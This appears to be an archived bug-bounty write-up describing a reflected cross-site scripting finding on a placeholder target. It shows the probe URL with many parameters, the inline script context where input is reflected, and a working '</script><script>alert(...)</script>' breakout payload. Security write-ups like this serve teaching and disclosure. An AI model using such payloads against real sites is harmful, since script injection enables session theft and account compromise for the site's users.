# How i got Cross-site Scripting (XSS)Reflected Using an unknown technique

- **Source URL:** https://medium.com/@0xmekky/how-i-got-cross-site-scripting-xss-reflected-using-an-unknown-technique-ca4984827465?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251128021519/https://medium.com/@0xmekky/how-i-got-cross-site-scripting-xss-reflected-using-an-unknown-technique-ca4984827465
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6628 (id 6628)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
***Let’s explain how I found* Cross-site Scripting (XSS) Reflected *vulnerabilities***

1After finding the parameter values are reflected in the response 

You will find it [here](/@0xmekky/how-i-got-easy-multiple-rxss-dd3a6bc521dd)

`https://ex.target.com/sitemap/?tab=mekky1&domain=mekky2&show=mekky3&submit=mekky4&move=mekky5&userid=mekky6&oitar=&key=mekky7&description=mekky8&user=mekky9&active=></script><script>alert("0xmekky_xss")</script>&success=mekky14&slug=mekky11`
\<script type="text/javascript">

topmenu = "mekky10";

\</script>


\<script type="text/javascript">

var mainmenu = "mekky10";

\</script>

\<script type="text/javascript">

var mainmenu = "mekky10>\<script>alert(1)\</script>";

\</script>

**Ok, I tried adding my payload after** \</script>


`</script><script>alert("0xmekky_xss")</script>&success=mekky14&slug=mekky15`
